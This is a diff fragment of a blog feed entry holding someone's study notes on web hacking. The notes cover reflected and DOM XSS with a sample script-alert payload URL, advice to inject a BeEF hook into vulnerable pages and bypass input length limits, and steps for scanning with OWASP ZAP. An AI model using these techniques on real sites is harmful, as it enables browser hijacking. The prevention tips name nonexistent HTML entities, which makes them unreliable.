-&lt;li&gt;Reflected XSS - non persistent xss. only will work if the target visits a specially crafted url eg. &lt;code&gt;target.com/page.php?something=&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;DOM based XSS&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Test text boxes and urls with parameters (the php stuff).&lt;/p&gt;
-&lt;p&gt;Inject beef hook into vulnerable pages. If text areas have a max length, go into developer console and inspect element and change the max length.&lt;/p&gt;
-&lt;h3 id="prevention-of-xss-vulnerabilities"&gt;Prevention of XSS Vulnerabilities&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;Minimize input.&lt;/li&gt;
-&lt;li&gt;Convert user input to the html character symbol so &lt;code&gt;&amp;amp;nsb&lt;/code&gt; and instead of &amp;amp; use &lt;code&gt;&amp;amp;jsjs;&lt;/code&gt;.&lt;/li&gt;
-&lt;li&gt;Escape the input.&lt;/li&gt;
-&lt;li&gt;Rarely trust alerts within the browser!&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id="to-automatically-discover-web-vulnerabilities"&gt;To Automatically Discover Web Vulnerabilities&lt;/h2&gt;
-&lt;p&gt;Use Zed Attack Proxy (zap) &lt;a href="https://owasp.org/www-project-zap/"&gt;https://owasp.org/www-project-zap/&lt;/a&gt;, this is already installed on Kali.&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Search in apps ZAP&lt;/li&gt;
-&lt;li&gt;You have to get this app via github.&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;chmod +x [name]&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;Run it&lt;/li&gt;
-&lt;li&gt;After install click no persistent.&lt;/li&gt;
-&lt;li&gt;The cog icon on the left allows options to be modified&lt;/li&gt;
-&lt;li&gt;If you click the green plus on the bottom window then go to active scans. then the little panel in the top left the the windows you can change policies.&lt;/li&gt;
-&lt;li&gt;Add the url in automated scan.&lt;/li&gt;
-&lt;li&gt;Bottom left under alerts, is where all the vulnerabilities that have been discovered are displayed.&lt;/li&gt;
-&lt;li&gt;If you right click one of the alerts (bottom left) then open in browsers it will show you the exploit and how it got it.&lt;/li&gt;
-&lt;/ol&gt;&lt;/body&gt;</content><category term="Software"></category><category term="software"></category><category term="infosec"></category></entry></feed>
+&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</content><category term="Javascript"></category><category term="javascript"></category></entry></feed>
